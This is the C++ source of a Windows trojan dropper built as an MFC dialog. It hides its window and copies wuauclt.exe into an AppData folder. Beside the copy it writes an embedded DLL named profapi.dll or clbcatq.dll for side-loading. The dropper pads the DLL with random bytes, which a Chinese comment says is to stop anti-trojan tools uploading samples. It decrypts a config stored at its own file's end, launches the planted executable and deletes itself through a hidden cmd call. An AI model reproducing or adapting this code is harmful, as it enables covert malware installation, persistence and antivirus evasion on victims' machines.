// mijian1Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "mijian1.h"
#include "mijian1Dlg.h"
#include "ProfApi.h"
#include "macro.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMijian1Dlg dialog

CMijian1Dlg::CMijian1Dlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMijian1Dlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMijian1Dlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMijian1Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMijian1Dlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMijian1Dlg, CDialog)
	//{{AFX_MSG_MAP(CMijian1Dlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMijian1Dlg message handlers

BOOL CMijian1Dlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	DWORD dw = GetWindowLong(m_hWnd, GWL_STYLE);
	dw &= ~WS_SYSMENU;
	SetWindowLong(m_hWnd, GWL_STYLE, dw);
	
	m_eventId = SetTimer(1000, 1000, NULL);
	DoActualWork();

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMijian1Dlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

void DeleteApplicationSelf()
{
	char szCommandLine[MAX_PATH + 10];
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, _pgmptr, NULL);
	sprintf(szCommandLine, "/c del /q %s", _pgmptr);
	ShellExecute(NULL, "open", "cmd.exe", szCommandLine, NULL, SW_HIDE);
	ExitProcess(0);
}

int CMijian1Dlg::DoActualWork()
{
	char appPath[MAX_PATH], appExe[MAX_PATH], appDll[MAX_PATH];
	SHGetSpecialFolderPath(NULL, appPath, CSIDL_APPDATA, FALSE);

	const char wuauclt[] = {'w', 'u', 'a', 'u', 'c', 'l', 't', '\0'};
	const char ms[] = {'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\0'}; 
	const char exe[] = {'.', 'e', 'x', 'e', '\0'};
	const char prof1[] = {'p', 'r', 'o', 'f', 'a', 'p', 'i', '.', 'd', 'l', 'l', '\0'};
	const char prof2[] = {'c', 'l', 'b', 'c', 'a', 't', 'q', '.', 'd', 'l', 'l', '\0'};
	const char* prof = NULL;

	OSVERSIONINFOA vInfo;
	ZeroMemory(&vInfo, sizeof(vInfo));
	vInfo.dwOSVersionInfoSize = sizeof(vInfo);
	if (!GetVersionExA(&vInfo) || vInfo.dwMajorVersion <= 4 )
		return -1;

	if(vInfo.dwMajorVersion == 6)	prof = prof1;
	else if(vInfo.dwMajorVersion == 5)	prof = prof2;

	strcat(appPath, "\\");
	strcat(appPath, ms);
	strcat(appPath, "\\");
	strcat(appPath, wuauclt);

	CreateDirectoryA(appPath, NULL);

	strcpy(appExe, appPath);
	strcat(appExe, "\\");
	strcat(appExe, wuauclt);
	strcat(appExe, exe);

	char sysExe[MAX_PATH];
	GetSystemDirectoryA(sysExe, MAX_PATH);
	strcat(sysExe, "\\");
	strcat(sysExe, wuauclt);
	strcat(sysExe, exe);

	CopyFileA(sysExe, appExe, FALSE);

	strcpy(appDll, appPath);
	strcat(appDll, "\\");
	strcat(appDll, prof);

	HANDLE hFile = CreateFileA(appDll, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	unsigned char* dllBuf = new unsigned char[ProfApi_size];
	if(GetProfApiResouceData(dllBuf, ProfApi_size,ProfApi_source, sizeof(ProfApi_source)) != 0)
	{
		delete []dllBuf;
		return -1;
	}

	DWORD nWrite;
	WriteFile(hFile, dllBuf, ProfApi_size, &nWrite, NULL);//写入PE文件
	delete []dllBuf;

	//这里随机写入一些数据，使得木马文件体积增大到一定程度，这样反木马工具 不会上传样板
	srand(time(NULL));
	int patchSize = (rand() % 10 + 1) * 64 * 8;
	for(int i = 0; i < patchSize; i++)
	{
		unsigned char bb[8] = {rand() % 256, rand() % 256, rand() % 256, rand() % 256,
			rand() % 256, rand() % 256, rand() % 256, rand() % 256};
		WriteFile(hFile,&bb, sizeof(bb), &nWrite, NULL);
	}

	union client_cfg cfg, cfg2;
	char selfFile[MAX_PATH] = {0};
	do
	{
		//首先读取配置信息（位于PE文件的最后）
		if(GetModuleFileNameA(NULL, selfFile, MAX_PATH) == 0)
			break;

		FILE* fp = fopen(selfFile, "rb");
		if(fp == NULL)	break;
		if(fseek(fp , 0 - sizeof(cfg) , SEEK_END))
		{
			fclose(fp);
			break;
		}
		fread(&cfg, sizeof(cfg) , 1, fp);
		memcpy(&cfg2, &cfg, sizeof(cfg));
		fclose(fp);

		//是否为合法的配置信息
		if(memcmp(&cfg2, CFG_MAGIC, 8) != 0)
			break;

		//将配置信息解密
		unsigned char* pp = (unsigned char*)&cfg2;
		for (int i = sizeof(CFG_MAGIC); i < sizeof(cfg2.cfg1); i++)
			pp[i] ^= 0xFF;
	}while(0);
	
	WriteFile(hFile,&cfg, sizeof(cfg), &nWrite, NULL);
	CloseHandle(hFile);

	STARTUPINFOA startupInfo = {0};
	startupInfo.cb = sizeof(startupInfo);
	PROCESS_INFORMATION processInfo = {0};

	if(CreateProcessA(appExe, NULL, NULL, NULL, FALSE, 0, NULL, appPath, &startupInfo, &processInfo))
	{
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}

	//DeleteApplicationSelf2();
	Sleep(1000);
	DeleteApplicationSelf();
	return 1;
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMijian1Dlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CMijian1Dlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	
	CDialog::OnTimer(nIDEvent);
	ShowWindow(SW_HIDE);

	if(nIDEvent == m_eventId)
	{
		KillTimer(m_eventId);
	}
}
